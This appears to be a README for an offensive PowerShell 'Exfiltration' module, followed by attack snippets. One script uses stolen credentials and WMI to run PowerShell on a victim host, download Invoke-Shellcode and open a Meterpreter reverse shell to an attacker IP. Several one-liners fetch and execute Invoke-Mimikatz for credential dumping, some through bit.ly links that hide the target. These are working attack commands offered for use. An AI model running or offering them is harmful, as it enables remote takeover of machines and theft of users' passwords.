To install this module, drop the entire Exfiltration folder into one of your module directories. The default PowerShell module paths are listed in the $Env:PSModulePath environment variable.

The default per-user module path is: "$Env:HomeDrive$Env:HOMEPATH\Documents\WindowsPowerShell\Modules"
The default computer-level module path is: "$Env:windir\System32\WindowsPowerShell\v1.0\Modules"

To use the module, type `Import-Module Exfiltration`

To see the commands imported, type `Get-Command -Module Exfiltration`

For help on each individual command, Get-Help is your friend.

Note: The tools contained within this module were all designed such that they can be run individually. Including them in a module simply lends itself to increased portability.





___________________________________________________________________________________

$VictimIP = '192.168.124.130'
$AttackerIP = '192.168.124.1'
$Hostname = 'WIN-92SPQPW9R24'
$Username = 'DevelopersDevelopersDevelopers'
$Credential = Get-Credential -Credential "$Hostname\$Username"
# Attacker then enters the password of the user
$Command = {Invoke-Shellcode -Payload windows/meterpreter/reverse_http -Lhost $AttackerIP -Lport 80}
$InvokeShellcodeUrl = 'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1'
$PayloadString = "iex(New-Object Net.WebClient).DownloadString('$InvokeShellcodeUrl');$Command"
 
$Parameters = @{
    ComputerName = $VictimIP
    Credential = $Credential
    Class = 'Win32_Process'
    Name = 'Create'
    ArgumentList = "powershell -nop -c $PayloadString"
}
 
Invoke-WmiMethod @Parameters






IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/Blue-Fin/ShellScript/master/Exfiltration/Invoke-Mimikatz.ps1")

or 

IEX (New-Object Net.WebClient).DownloadString("http://bit.ly/2yNKBNr")



IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1")
or
IEX (New-Object Net.WebClient).DownloadString("http://bit.ly/1ok4Pmt")